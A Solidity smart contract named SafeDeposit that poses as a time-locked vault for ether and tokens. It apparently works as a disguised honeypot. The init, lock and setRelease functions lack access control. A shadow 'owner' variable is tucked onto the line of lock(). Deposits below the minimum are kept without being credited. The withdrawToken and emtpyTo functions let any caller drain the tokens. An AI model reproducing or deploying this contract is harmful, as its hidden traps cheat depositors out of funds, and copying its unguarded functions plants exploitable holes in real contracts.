['// Copyright (C) 2017  The Halo Platform by Scott Morrison\n', '//\n', '// This is free software and you are welcome to redistribute it under certain conditions.\n', '// ABSOLUTELY NO WARRANTY; for details visit: https://www.gnu.org/licenses/gpl-2.0.html\n', '//\n', 'pragma solidity ^0.4.18;\n', '\n', '// minimum token interface\n', 'contract Token {\n', '    function balanceOf(address who) public constant returns (uint256);\n', '    function transfer(address to, uint amount) public returns (bool);\n', '}\n', '\n', 'contract Ownable {\n', '    address Owner = msg.sender;\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    function transferOwnership(address to) public onlyOwner { Owner = to; }\n', '}\n', '\n', '// tokens are withdrawable\n', 'contract TokenVault is Ownable {\n', '\n', '    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {\n', '        return Token(token).transfer(to, amount);\n', '    }\n', '    \n', '    function withdrawToken(address token) public returns (bool) {\n', '        address self = address(this);\n', '        return withdrawTokenTo(token, msg.sender, Token(token).balanceOf(self));\n', '    }\n', '    \n', '    function emtpyTo(address token, address to) public returns (bool) {\n', '        address self = address(this);\n', '        return withdrawTokenTo(token, to, Token(token).balanceOf(self));\n', '    }\n', '}\n', '\n', '// store ether & tokens for a period of time\n', 'contract SafeDeposit is TokenVault {\n', '    \n', '    event Deposit(address indexed depositor, uint amount);\n', '    event Withdrawal(address indexed to, uint amount);\n', '    event OpenDate(uint date);\n', '\n', '    mapping (address => uint) public Deposits;\n', '    uint minDeposit;\n', '    bool Locked;\n', '    uint Date;\n', '\n', '    function init() payable open {\n', '        Owner = msg.sender;\n', '        minDeposit = 1 ether;\n', '        Locked = false;\n', '        deposit();\n', '    }\n', '    \n', '    function MinimumDeposit() public constant returns (uint) { return minDeposit; }\n', '    function ReleaseDate() public constant returns (uint) { return Date; }\n', '    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }\n', '\n', '    function() public payable { deposit(); }\n', '\n', '    function deposit() public payable {\n', '        if (msg.value > 0) {\n', '            if (msg.value >= MinimumDeposit())\n', '                Deposits[msg.sender] += msg.value;\n', '            Deposit(msg.sender, msg.value);\n', '        }\n', '    }\n', '\n', '    function setRelease(uint newDate) public { \n', '        Date = newDate;\n', '        OpenDate(Date);\n', '    }\n', '\n', '    function withdraw(address to, uint amount) public onlyOwner {\n', '        if (WithdrawEnabled()) {\n', '            uint max = Deposits[msg.sender];\n', '            if (max > 0 && amount <= max) {\n', '                to.transfer(amount);\n', '                Withdrawal(to, amount);\n', '            }\n', '        }\n', '    }\n', '\n', '    function lock() public { Locked = true; } address owner;\n', '    modifier open { if (!Locked) _; owner = msg.sender; }\n', '    function kill() public { require(this.balance == 0); selfdestruct(Owner); }\n', '    function getOwner() external constant returns (address) { return owner; }\n', '}']